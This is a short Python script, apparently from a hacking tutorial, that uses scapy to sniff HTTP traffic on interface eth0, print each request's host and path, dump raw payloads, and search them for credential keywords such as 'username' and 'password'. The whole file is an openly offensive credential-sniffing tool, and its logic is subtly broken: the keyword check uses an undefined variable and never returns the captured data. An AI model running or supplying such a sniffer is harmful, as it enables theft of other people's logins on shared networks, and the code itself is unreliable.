#! must pip install scapy-http
import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		print(packet[scapy.Raw].load)
		keywords = ["username", "login", "email", "user", "password", "pass"]
		for word in keywords:
			if word in load:
				return

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print('[+] HTTP Request>> ' + url)

		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible username and password > " + login_info + "\n\n")

sniff("eth0")